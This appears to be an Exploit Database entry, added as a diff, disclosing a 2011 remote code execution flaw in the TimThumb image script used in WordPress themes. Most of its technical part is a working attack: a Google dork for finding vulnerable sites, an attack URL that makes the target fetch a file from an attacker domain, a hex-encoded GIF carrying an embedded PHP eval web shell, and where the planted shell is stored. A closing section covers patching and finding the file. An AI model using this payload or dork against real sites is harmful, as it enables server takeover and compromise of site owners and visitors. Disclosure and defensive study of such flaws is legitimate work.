@@ -1,0 +1,80 @@
+# Exploit Title: WordPress TimThumb Plugin - Remote Code Execution
+# Google Dork: inurl:timthumb ext:php -site:googlecode.com -site:google.com
+# Date: 3rd August 2011
+# Author: MaXe
+# Software Link: http://timthumb.googlecode.com/svn-history/r141/trunk/timthumb.php
+# Version: 1.32
+# Screenshot: See attachment
+# Tested on: Windows XP + Apache + PHP (XAMPP)
+ 
+ 
+WordPress TimThumb (Theme) Plugin - Remote Code Execution
+ 
+ 
+Versions Affected: 
+1.* - 1.32 (Only version 1.19 and 1.32 were tested.)
+(Version 1.33 did not save the cache file as .php)
+
+ 
+Info: (See references for original advisory)
+TimThumb is an image resizing utility, widely used in many WordPress themes.
+
+ 
+External Links:
+http://www.binarymoon.co.uk/projects/timthumb/
+http://code.google.com/p/timthumb/
+ 
+Credits: 
+- Mark Maunder (Original Researcher)
+- MaXe (Indepedendent Proof of Concept Writer)
+ 
+ 
+-:: The Advisory ::-
+TimThumb is prone to a Remote Code Execution vulnerability, due to the
+script does not check remotely cached files properly. By crafting a
+special image file with a valid MIME-type, and appending a PHP file at
+the end of this, it is possible to fool TimThumb into believing that it
+is a legitimate image, thus caching it locally in the cache directory.
+
+
+Attack URL: (Note! Some websites uses Base64 Encoding of the src GET-request.)
+http://www.target.tld/wp-content/themes/THEME/timthumb.php?src=http://blogger.com.evildomain.tld/pocfile.php
+
+Stored file on the Target: (This can change from host to host.)
+1.19: http://www.target.tld/wp-content/themes/THEME/cache/md5($src);
+1.32: http://www.target.tld/wp-content/themes/THEME/cache/external_md5($src);
+md5($src); means the input value of the 'src' GET-request - Hashed in MD5 format.
+
+
+Proof of Concept File:
+\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00
+\xFF\xFF\xFF\x00\x00\x00\x21\xF9\x04\x01\x00\x00\x00
+\x00\x2C\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02
+\x44\x01\x00\x3B\x00\x3C\x3F\x70\x68\x70\x20\x40\x65
+\x76\x61\x6C\x28\x24\x5F\x47\x45\x54\x5B\x27\x63\x6D
+\x64\x27\x5D\x29\x3B\x20\x3F\x3E\x00
+
+(Transparent GIF + <?php @eval($_GET['cmd']) ?>
+
+ 
+ 
+-:: Solution ::-
+Update to the latest version 1.34 or delete the timthumb file.
+
+NOTE: This file is often renamed and you should therefore issue
+a command like this in a terminal: (Thanks to rAWjAW for this info.)
+find . | grep php | xargs grep -s timthumb
+ 
+ 
+Disclosure Information:
+- Vulnerability Disclosed (Mark Maunder): 1st August 2011
+- Vulnerability Researched (MaXe): 2nd August 2011
+- Disclosed at The Exploit Database: 3rd August 2011
+
+ 
+ 
+References:
+http://markmaunder.com/2011/zero-day-vulnerability-in-many-wordpress-themes/
+http://markmaunder.com/2011/technical-details-and-scripts-of-the-wordpress-timthumb-php-hack/
+http://code.google.com/p/timthumb/issues/detail?id=212
+http://programming.arantius.com/the+smallest+possible+gif
